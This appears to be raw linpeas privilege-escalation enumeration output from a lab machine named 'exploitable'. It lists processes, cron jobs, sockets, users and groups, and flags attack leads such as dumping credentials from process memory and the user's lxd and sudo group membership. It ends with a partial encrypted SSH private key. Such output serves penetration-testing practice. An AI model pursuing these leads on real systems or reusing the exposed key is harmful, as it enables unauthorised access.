root       911  0.0  2.3 327124 11764 ?        Ss   02:09   0:00 /usr/sbin/apache2 -k start
www-data   913  0.0  1.6 331632  8240 ?        S    02:09   0:00  _ /usr/sbin/apache2 -k start
www-data   914  0.0  1.6 331584  8180 ?        S    02:09   0:00  _ /usr/sbin/apache2 -k start
www-data  1132  0.0  1.6 331632  8248 ?        S    02:11   0:00  _ /usr/sbin/apache2 -k start
www-data  1133  0.0  1.6 331632  8244 ?        S    02:11   0:00  _ /usr/sbin/apache2 -k start
www-data  1134  0.0  1.6 331592  8148 ?        S    02:11   0:00  _ /usr/sbin/apache2 -k start
www-data  1135  0.0  1.6 331632  8212 ?        S    02:11   0:00  _ /usr/sbin/apache2 -k start
www-data  1136  0.0  1.6 331584  8188 ?        S    02:11   0:00  _ /usr/sbin/apache2 -k start
www-data  1137  0.0  1.6 331632  8240 ?        S    02:11   0:00  _ /usr/sbin/apache2 -k start
www-data  1140  0.0  1.6 331600  8196 ?        S    02:11   0:00  _ /usr/sbin/apache2 -k start
www-data  1141  0.0  1.6 331632  8244 ?        S    02:11   0:00  _ /usr/sbin/apache2 -k start
www-data  1142  0.0  1.6 331584  8184 ?        S    02:11   0:00  _ /usr/sbin/apache2 -k start
www-data  1143  0.0  1.6 331592  8188 ?        S    02:11   0:00  _ /usr/sbin/apache2 -k start
www-data  1144  0.0  1.6 331584  8184 ?        S    02:11   0:00  _ /usr/sbin/apache2 -k start
www-data  1146  0.0  1.6 331584  8124 ?        S    02:11   0:00  _ /usr/sbin/apache2 -k start
www-data  1204  0.0  2.0 331584 10092 ?        S    02:13   0:00  _ /usr/sbin/apache2 -k start
www-data  1314  0.0  2.0 331584 10056 ?        S    02:18   0:00  _ /usr/sbin/apache2 -k start
www-data  1315  0.0  2.0 331584 10056 ?        S    02:18   0:00  _ /usr/sbin/apache2 -k start
www-data  1317  0.0  2.0 331584 10092 ?        S    02:18   0:00  _ /usr/sbin/apache2 -k start
john      1590  0.0  1.5  76628  7508 ?        Ss   02:28   0:00 /lib/systemd/systemd --user
john      1591  0.0  0.4 193580  2304 ?        S    02:28   0:00  _ (sd-pam)
root      5033  1.2  7.0 717876 34804 ?        Ssl  02:34   0:00 /usr/lib/lxd/lxd --group lxd --logfile=/var/log/lxd/lxd.log
lxd       5160  0.0  0.0  51584   384 ?        S    02:34   0:00 dnsmasq --strict-order --bind-interfaces --pid-file=/var/lib/lxd/networks/lxdbr0/dnsmasq.pid --except-interface=lo --interface=lxdbr0 --quiet-dhcp --quiet-dhcp6 --quiet-ra --listen-address=10.229.116.1 --dhcp-no-override --dhcp-authoritative --dhcp-leasefile=/var/lib/lxd/networks/lxdbr0/dnsmasq.leases --dhcp-hostsfile=/var/lib/lxd/networks/lxdbr0/dnsmasq.hosts --dhcp-range 10.229.116.2,10.229.116.254,1h --listen-address=fd42:2998:1e63:3d6f::1 --enable-ra --dhcp-range ::,constructor:lxdbr0,ra-stateless,ra-names -s lxd -S /lxd/ --conf-file=/var/lib/lxd/networks/lxdbr0/dnsmasq.raw -u lxd
  └─(Caps) 0x0000000000003000=cap_net_admin,cap_net_raw

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                                                                                                
                                                                                                                                                                                                                                            
╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                                                                                                          
COMMAND    PID  TID             USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME                                                                                                                                             

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                                                                                                                                          
gdm-password Not Found                                                                                                                                                                                                                      
gnome-keyring-daemon Not Found                                                                                                                                                                                                              
lightdm Not Found                                                                                                                                                                                                                           
vsftpd Not Found                                                                                                                                                                                                                            
apache2 process found (dump creds from memory as root)                                                                                                                                                                                      
sshd: process found (dump creds from memory as root)

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                                                                                                      
/usr/bin/crontab                                                                                                                                                                                                                            
incrontab Not Found
-rw-r--r-- 1 root root     722 Nov 16  2017 /etc/crontab                                                                                                                                                                                    

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 Feb  5  2020 .
drwxr-xr-x 93 root root 4096 Jul 27  2020 ..
-rw-r--r--  1 root root  589 Jan 30  2019 mdadm
-rw-r--r--  1 root root  712 Jan 17  2018 php
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--  1 root root  191 Aug  5  2019 popularity-contest

/etc/cron.daily:
total 64
drwxr-xr-x  2 root root 4096 Feb  5  2020 .
drwxr-xr-x 93 root root 4096 Jul 27  2020 ..
-rwxr-xr-x  1 root root  539 Jul 16  2019 apache2
-rwxr-xr-x  1 root root  376 Nov 20  2017 apport
-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  539 Jan 30  2019 mdadm
-rwxr-xr-x  1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x  1 root root  246 Mar 21  2018 ubuntu-advantage-tools
-rwxr-xr-x  1 root root  214 Nov 12  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Aug  5  2019 .
drwxr-xr-x 93 root root 4096 Jul 27  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Aug  5  2019 .
drwxr-xr-x 93 root root 4096 Jul 27  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Aug  5  2019 .
drwxr-xr-x 93 root root 4096 Jul 27  2020 ..
-rwxr-xr-x  1 root root  723 Apr  7  2018 man-db
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  211 Nov 12  2018 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                                                                                                                                              
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin                                                                                                                                                                 

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                                                                                                                                 
You can't write on systemd PATH                                                                                                                                                                                                             

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                                                                                                   
NEXT                         LEFT           LAST                         PASSED    UNIT                         ACTIVATES                                                                                                                   
Sat 2022-11-05 02:39:00 UTC  4min 36s left  Sat 2022-11-05 02:09:21 UTC  25min ago phpsessionclean.timer        phpsessionclean.service
Sat 2022-11-05 06:24:32 UTC  3h 50min left  Sat 2022-11-05 02:09:21 UTC  25min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Sat 2022-11-05 10:55:30 UTC  8h left        Sat 2022-11-05 02:09:21 UTC  25min ago apt-daily.timer              apt-daily.service
Sat 2022-11-05 20:36:39 UTC  18h left       Sat 2022-11-05 02:09:21 UTC  25min ago motd-news.timer              motd-news.service
Sun 2022-11-06 02:23:59 UTC  23h left       Sat 2022-11-05 02:23:59 UTC  10min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Mon 2022-11-07 00:00:00 UTC  1 day 21h left Sat 2022-11-05 02:09:21 UTC  25min ago fstrim.timer                 fstrim.service
n/a                          n/a            n/a                          n/a       snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a            n/a                          n/a       ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                                                                                                   
                                                                                                                                                                                                                                            
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                                                                                                  
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request                                                                                                                                 
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request
/snap/core/7270/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/7270/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/7270/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core/7270/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core/7270/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/snap/core/7270/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/snap/core/7270/lib/systemd/system/systemd-bus-proxyd.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/7270/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core/7270/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core/7270/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/snap/core/8268/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/8268/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                                                                                                  
/run/acpid.socket                                                                                                                                                                                                                           
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/lvm/lvmetad.socket
/run/lvm/lvmpolld.socket
/run/snapd-snap.socket
  └─(Read Write)
/run/snapd.socket
  └─(Read Write)
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/user/1000/gnupg/S.dirmngr
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent.browser
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent.extra
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent.ssh
  └─(Read Write)
/run/user/1000/snapd-session-agent.socket
  └─(Read Write)
/run/user/1000/systemd/notify
  └─(Read Write)
/run/user/1000/systemd/private
  └─(Read Write)
/run/uuidd/request
  └─(Read Write)
/var/lib/lxd/devlxd/sock
  └─(Read Write)
/var/lib/lxd/unix.socket
  └─(Read Write)
/var/run/dbus/system_bus_socket
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                                                                                                    
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)                                                                                                                                      
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                                                                                                    
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION                                                                                                    
:1.0                                 676 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
:1.1                                 692 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
:1.2                                   1 systemd         root             :1.2          init.scope                -          -                  
:1.27                               8485 busctl          john             :1.27         session-4.scope           4          -                  
:1.3                                 771 accounts-daemon[0m root             :1.3          accounts-daemon.service   -          -                  
:1.5                                 818 polkitd         root             :1.5          polkit.service            -          -                  
:1.6                                 791 systemd-logind  root             :1.6          systemd-logind.service    -          -                  
:1.8                                 862 unattended-upgr root             :1.8          unattended-upgrades.se…ce -          -                  
:1.9                                 801 networkd-dispat root             :1.9          networkd-dispatcher.se…ce -          -                  
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         
io.netplan.Netplan                     - -               -                (activatable) -                         -         
org.freedesktop.Accounts             771 accounts-daemon[0m root             :1.3          accounts-daemon.service   -          -                  
org.freedesktop.DBus                   1 systemd         root             -             init.scope                -          -                  
org.freedesktop.PolicyKit1           818 polkitd         root             :1.5          polkit.service            -          -                  
org.freedesktop.hostname1              - -               -                (activatable) -                         -         
org.freedesktop.locale1                - -               -                (activatable) -                         -         
org.freedesktop.login1               791 systemd-logind  root             :1.6          systemd-logind.service    -          -                  
org.freedesktop.network1             676 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
org.freedesktop.resolve1             692 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
org.freedesktop.systemd1               1 systemd         root             :1.2          init.scope                -          -                  
org.freedesktop.thermald               - -               -                (activatable) -                         -         
org.freedesktop.timedate1              - -               -                (activatable) -                         -         


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                                                                                                         
                              ╚═════════════════════╝                                                                                                                                                                                       
╔══════════╣ Hostname, hosts and DNS
exploitable                                                                                                                                                                                                                                 
127.0.0.1 localhost
127.0.1.1 exploitable

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0
search eu-west-1.compute.internal

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                                                                                                         
link-local 169.254.0.0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.27.3  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::fe:c7ff:fe6a:ceb3  prefixlen 64  scopeid 0x20<link>
        ether 02:fe:c7:6a:ce:b3  txqueuelen 1000  (Ethernet)
        RX packets 139649  bytes 22091285 (22.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 137086  bytes 66294080 (66.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 338  bytes 29472 (29.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 338  bytes 29472 (29.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lxdbr0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.229.116.1  netmask 255.255.255.0  broadcast 0.0.0.0
        inet6 fd42:2998:1e63:3d6f::1  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::7c83:bbff:fe89:7da1  prefixlen 64  scopeid 0x20<link>
        ether 7e:83:bb:89:7d:a1  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10  bytes 1212 (1.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                                                               
tcp        0      0 10.229.116.1:53         0.0.0.0:*               LISTEN      -                                                                                                                                                           
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 fd42:2998:1e63:3d6f::53 :::*                    LISTEN      -                   
tcp6       0      0 fe80::7c83:bbff:fe89:53 :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                            


                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users                                                                                                                                                                    
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)                                                                                                                                      

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                                                                                                                                
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
                                                                                                                                                                                                                                            
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                                                                                                                                      
ptrace protection is enabled (1)                                                                                                                                                                                                            
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                                                                                                  
                                                                                                                                                                                                                                            
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                                                                                             

╔══════════╣ Users with console
john:x:1000:1000:john:/home/john:/bin/bash                                                                                                                                                                                                  
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                                                                                                      
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=108(landscape) gid=112(landscape) groups=112(landscape)
uid=109(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 02:34:27 up 25 min,  1 user,  load average: 0.77, 0.26, 0.27                                                                                                                                                                               
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
john     pts/0    10.18.23.136     02:28   43.00s  0.12s  0.00s /bin/sh ./linpeas.sh

╔══════════╣ Last logons
john     tty1         Wed Feb  5 09:57:42 2020 - down                      (02:23)     0.0.0.0                                                                                                                                              
reboot   system boot  Wed Feb  5 09:57:07 2020 - Wed Feb  5 12:21:29 2020  (02:24)     0.0.0.0
john     tty1         Wed Feb  5 09:32:40 2020 - down                      (00:21)     0.0.0.0
reboot   system boot  Wed Feb  5 09:32:03 2020 - Wed Feb  5 09:54:26 2020  (00:22)     0.0.0.0
john     tty1         Wed Feb  5 09:30:59 2020 - down                      (00:00)     0.0.0.0
reboot   system boot  Wed Feb  5 09:28:16 2020 - Wed Feb  5 09:31:18 2020  (00:03)     0.0.0.0
john     tty1         Wed Feb  5 09:09:02 2020 - down                      (00:17)     0.0.0.0
reboot   system boot  Wed Feb  5 09:07:20 2020 - Wed Feb  5 09:26:17 2020  (00:18)     0.0.0.0

wtmp begins Wed Feb  5 09:07:20 2020

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                                                                                                                           
john             pts/0    10.18.23.136     Sat Nov  5 02:28:31 +0000 2022

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
                                                                                                                                                                                                                                            
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                                                                                                            


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                                                                                                                          
                             ╚══════════════════════╝                                                                                                                                                                                       
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                                                                                                             
/usr/bin/curl
/usr/bin/lxc
/bin/nc
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python3
/usr/bin/python3.6
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
/usr/share/gcc-8                                                                                                                                                                                                                            

╔══════════╣ Searching mysql credentials and exec
                                                                                                                                                                                                                                            
╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.29 (Ubuntu)                                                                                                                                                                                      
Server built:   2019-09-16T12:58:48
httpd Not Found
                                                                                                                                                                                                                                            
Nginx version: nginx Not Found
                                                                                                                                                                                                                                            
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php-source 
--
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php-source 
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Feb  5  2020 /etc/apache2/sites-enabled                                                                                                                                                                         
drwxr-xr-x 2 root root 4096 Feb  5  2020 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Feb  5  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


-rw-r--r-- 1 root root 1332 Jul 16  2019 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Feb  5  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 71817 Jan 13  2020 /etc/php/7.2/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 71429 Jan 13  2020 /etc/php/7.2/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On



╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Dec 13  2017 /usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                                                          
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                                                                                                        
drwxr-xr-x 2 root root 4096 Feb  5  2020 /etc/ldap


╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
-rw------- 1 john john 1766 Feb  5  2020 /home/john/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547
T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
